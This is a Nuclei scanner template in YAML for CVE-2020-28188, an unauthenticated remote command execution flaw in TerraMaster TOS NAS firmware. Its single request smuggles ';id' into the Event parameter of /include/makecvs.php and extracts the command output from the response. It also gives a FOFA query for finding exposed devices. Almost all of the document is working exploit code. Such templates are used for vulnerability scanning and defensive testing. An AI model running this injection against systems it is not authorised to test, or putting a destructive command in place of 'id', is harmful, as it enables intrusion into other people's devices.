id: terramaster-tos-rce-cve-2020-28188

info:
  name: TerraMaster TOS RCE (CVE-2020-28188)
  author: Ashro
  severity: critical
  description: |
    Remote Command Execution (RCE) vulnerability in TerraMaster TOS <= 4.2.06 allows remote unauthenticated attackers to inject OS commands via /include/makecvs.php in Event parameter.
  tags: rce, terramaster
  reference:
  classification:
  metadata:
    fofa-query: app="TerraMaster-NAS"
    max-request: 1

requests:
  - method: GET
    path:
      - "{{BaseURL}}/include/makecvs.php?Event=;id"

    headers:
      User-Agent: nuclei

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "uid="

    extractors:
      - type: regex
        part: body
        name: command_output
        regex:
          - "uid=.*"
